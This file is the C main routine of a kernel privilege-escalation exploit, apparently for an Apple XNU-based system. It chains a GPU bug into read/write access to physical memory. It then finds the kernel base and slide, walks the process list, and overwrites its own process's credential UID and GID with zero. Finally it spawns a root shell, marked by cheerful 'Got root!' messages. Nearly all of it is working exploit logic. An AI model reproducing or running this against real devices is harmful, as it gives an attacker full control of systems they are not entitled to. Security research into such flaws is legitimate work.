#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "types.h"
#include "runner.h"
#include "hvcall.h"
#include "constants.h"
#include "utils.h"

void hexdump(const void *d, size_t len);

#define NPTE 2048

u64 page[NPTE];

#define MAX_TRIES 64

int main(int argc, const char * argv[]) {
    int i;

    if (runner_init() < 0) {
        printf("Init failed\n");
        return 1;
    }

    if(getenv("TRACE"))
        resume_tracing();

    /********* Exploit stage 1 *********/
    printf("### Stage 1: Exploit the GPU to get a page table\n\n");
    for (i = 0; i < MAX_TRIES; i++) {
        printf("## Attempt %d/%d\n", i + 1, MAX_TRIES);
        if (stage1())
            break;
    }

    if (i >= MAX_TRIES) {
        printf("Failed to exploit after %d attempts.\n", MAX_TRIES);
        printf("Maybe try again?\n");
        return 1;
    }

    printf("Stage 1 success! (.❛ ᴗ ❛.)\n\n");

    /********* Exploit stage 2 *********/
    printf("### Stage 2: Map all physical memory R/W\n\n");
    u64 p_ram_start, ram_size;
    if (!stage2(&p_ram_start, &ram_size)) {
        printf("Failed to map physical memory R/W\n");
        return 1;
    }

    u64 got_magic = read64(p_ram_start);
    printf("Magic value:            0x%llx\n", got_magic);

    if (magic != got_magic) {
        printf("Failed to read magic value from RAM\n");
        return 1;
    }

    printf("\nStage 2 success! (๑˃ᴗ˂)ﻭ\n\n");

    /********* Compromise the kernel *********/
    printf("### Find kernel base\n\n");

    u64 p_kern_base = 0;
    if (!find_kbase(&p_kern_base) || !p_kern_base) {
        printf("Failed to find kernel base\n");
        return 1;
    }
    printf("Kernel base:            0x%llx\n\n", p_kern_base);

    printf("### Find kernel TTBR1\n\n");

    u64 kern_ttbr = 0;
    if (!find_kttbr1(&kern_ttbr) || !kern_ttbr) {
        printf("Failed to find kernel TTBR1\n");
        return 1;
    }
    printf("Kernel TTBR1:           0x%llx\n\n", kern_ttbr);

    printf("### Find kernel slide\n\n");

    /* The next page tables are at predictable offsets */
    readmem(kern_ttbr + 0x4000, SZ_16K, page);
    u64 bot_l2;
    for (bot_l2 = 1; bot_l2 < NPTE; bot_l2++)
        if (page[bot_l2]) break;

    if (bot_l2 >= NPTE) {
        printf("Failed to find kernel bottom L2\n");
        return 1;
    }

    readmem(kern_ttbr + 0xc000, SZ_16K, page);
    u64 bot_l3;
    for (bot_l3 = 0; bot_l3 < NPTE; bot_l3++)
        if (page[bot_l3]) break;

    if (bot_l3 >= NPTE) {
        printf("Failed to find kernel bottom L3\n");
        return 1;
    }

#define kread64(a) vread64(kern_ttbr, (a) | kpac_mask)
#define kread32(a) vread32(kern_ttbr, (a) | kpac_mask)
#define kwrite64(a, v) vwrite64(kern_ttbr, (a) | kpac_mask, v)
#define kwrite32(a, v) vwrite32(kern_ttbr, (a) | kpac_mask, v)

    u64 p_kern_bot = page[bot_l3] & 0xffffffc000;
    u64 k_kern_bot = 0xfffffe0000000000 + bot_l2 * SZ_32M + bot_l3 * SZ_16K;
    u64 k_kern_base = k_kern_bot - p_kern_bot + p_kern_base;
    u64 kslide = k_kern_base - ku_kern_base;
    u32 kmagic = kread32(ku_kern_base + kslide);

    printf("Kernel bottom:          0x%llx (0x%llx)\n", k_kern_bot, p_kern_bot);
    printf("Kernel virtual base:    0x%llx\n", k_kern_base);
    printf("Kernel slide:           0x%llx\n", kslide);
    printf("Kernel magic:           0x%x\n", kmagic);

    if (kmagic != 0xfeedfacf) {
        printf("Failed to read kernel Mach-O magic\n");
        return 1;
    }

    printf("\n### Find our process\n\n");
    u32 my_pid = getpid();

    printf("Looking for PID %d...\n", my_pid);
    u64 k_proc = kread64(ku_allproc + kslide);
    while (k_proc) {
        u32 pid = kread32(k_proc + off_proc_pid);
        if (pid == my_pid)
            break;
        k_proc = kread64(k_proc);
    }
    if (!k_proc) {
        printf("Failed to find our process structure\n");
        return 1;
    }

    printf("Struct proc:            0x%llx\n", k_proc);
    printf("  PID:                  %d\n\n", kread32(k_proc + off_proc_pid));

    printf("### Become root\n\n");

    u64 k_proc_ro = kread64(k_proc + off_proc_ro);
    printf("Struct proc_ro:         0x%llx\n", k_proc_ro);
    u64 k_ucred = kread64(k_proc_ro + off_proc_ro_ucred);
    printf("Struct ucred:           0x%llx\n", k_ucred);
    u32 svuid = kread32(k_ucred + off_ucred_svuid);
    u32 svgid = kread32(k_ucred + off_ucred_svgid);
    printf("  Saved UID:            %d\n", svuid);
    printf("  Saved GID:            %d\n\n", svgid);

    printf("Becoming root... (๑•̀ - •́)و✧\n\n");

    kwrite32(k_ucred + off_ucred_svuid, 0);
    kwrite32(k_ucred + off_ucred_svgid, 0);

    svuid = kread32(k_ucred + off_ucred_svuid);
    svgid = kread32(k_ucred + off_ucred_svgid);
    printf("  Saved UID:            %d\n", svuid);
    printf("  Saved GID:            %d\n\n", svgid);

    int ret;
    if ((ret = seteuid(0))) {
        printf("seteuid() returned %d\n", ret);
        return 1;
    }
    if ((ret = setegid(0))) {
        printf("setegid() returned %d\n", ret);
        return 1;
    }
    if ((ret = setuid(0))) {
        printf("setuid() returned %d\n", ret);
        return 1;
    }
    if ((ret = setgid(0))) {
        printf("setgid() returned %d\n", ret);
        return 1;
    }

    u32 uid = getuid();
    u32 gid = getgid();

    printf("getuid() returned:      %d\n", uid);
    printf("getgid() returned:      %d\n\n", gid);

    if (uid || gid) {
        printf("Failed to become root\n");
        return 1;
    }

    if(getenv("TRACE"))
        pause_tracing();

    printf("Got root! ٩(๑❛ᴗ❛๑)۶\n\n");
    execl("/bin/sh", "/bin/sh", NULL);

    return 0;
}
